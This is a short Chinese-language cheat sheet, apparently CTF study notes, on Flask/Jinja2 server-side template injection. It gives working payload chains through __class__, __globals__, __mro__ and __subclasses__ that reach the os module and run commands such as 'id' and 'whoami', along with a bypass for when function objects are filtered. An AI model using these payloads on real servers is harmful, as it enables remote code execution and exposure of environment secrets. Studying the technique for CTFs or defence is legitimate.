# flask模板注入
#### `__class__`:获取元素的类型

##### 变量/对象.__class__:元素的类型

```
变量/对象.__class__
```



## 1.拥有对象方法的元素未被禁用

### 元素是带有函数的对象时:

```
对象().__class__
```

##### **<u>所有对象基本都有构造函数,在不知道有哪些对象或者对象被过滤时,可以使用config,request,session,g</u>**

### `__init__`:拿出构造函数对象object的方法

```
cat().__class__.__init__
```
#### **或者直接使用`url_for()`,`get_flashed_messages()`,lipsum,cycler(),joiner(),namespace()这些象征函数对象方法的**

```
url_for().__globals__['os'].popen('id').read()
```

#### `__globals__`:对象方法模块的全局字典,包含os等主要模块

```
url_for().__class__.__init__.__globals__
```
#### 掏出全局字典的os
```
url_for().__class__.__init__.__globals__['os']
```


#### 拿到os模块后开始执行命令
```
os=().__class__.__init__.__globals__['os']
os.popen('whoami').read()    # 执行命令，读回输出
os.system('id')              # 执行命令，不回显
os.environ                   # 读环境变量（常藏 flag）
```



## 2.拥有对象方法的元素被禁用

### 元素是不带有函数的字面量时:

##### "",(),[]以及一些字面量当作元素是不存在`__globals__`

### 2.1使用base找出他的上级object属性,大部分变量上级都是object

```
().__class__.__base__			直接父类
().__class__.__bases__			直接父类们（多继承）
```

### 2.2使用mro找出他的上级object属性

```
().__class__.__mro__		从自己到object的完整链
```

```
().__class__.__mro__[1]			拿出指定object父类
```

### 使用`__subclasses__`()列出他的所有子类

```
.__base__ / __mro__[1].__subclasses__()
```

### 找到含有os的子类,用下标锁定,然后使用原方案,此时已绕过元素限制获得类属性,按照上述的获取函数方法提取os模板即可

```
().__class__.__mro__[1].__subclasses__()[下标].__init__.__globals__['os'].popen('id').read()
```

